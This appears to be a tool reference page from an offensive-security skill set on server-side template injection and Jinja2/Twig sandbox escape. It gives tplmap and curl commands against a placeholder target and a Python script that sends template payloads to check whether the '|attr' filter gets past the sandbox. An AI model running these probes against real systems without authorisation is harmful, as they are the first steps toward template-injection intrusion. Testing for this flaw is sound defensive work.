# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`ssti-sandbox-escape`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `tplmap` | `tplmap -u 'https://target.example/note?note=*' --engine Jinja2` | Pin the engine and let tplmap enumerate which sandbox-escape gadgets resolve without launching command stages | Linux, macOS, Windows |
| `pip` | `pip show jinja2` | Read the installed engine version to confirm whether it predates the GHSA-cpwx-vrp4-4pq7 fix | Cross-platform |
| `curl` | `curl -sS -G https://target.example/note --data-urlencode "note={{7*7}}"` | Send the arithmetic canary, then compare the attr-filter route against the dotted attribute route to test single-level sandbox mediation | Cross-platform |
| `composer` | `composer show twig/twig` | Check the Twig version against the Grav safe-filter advisory before asserting a live escape | Cross-platform |

## Minimal Script Shape

Sends a directly forbidden attribute and the same attribute via the `|attr` filter and reports single-level mediation when the direct route is blocked but the filter route renders.

```python
import urllib.parse
import urllib.request

BASE = "https://target.example/note"

def render(expr):
    url = BASE + "?" + urllib.parse.urlencode({"note": expr})
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, ""

direct_status, direct_body = render("{{().__class__}}")
attr_status, attr_body = render("{{ ''|attr('__class__') }}")
escaped = direct_status >= 400 and attr_status == 200 and "class" in attr_body
print({"direct_blocked": direct_status >= 400,
       "attr_route_rendered": attr_status == 200,
       "single_level_mediation": escaped})
```
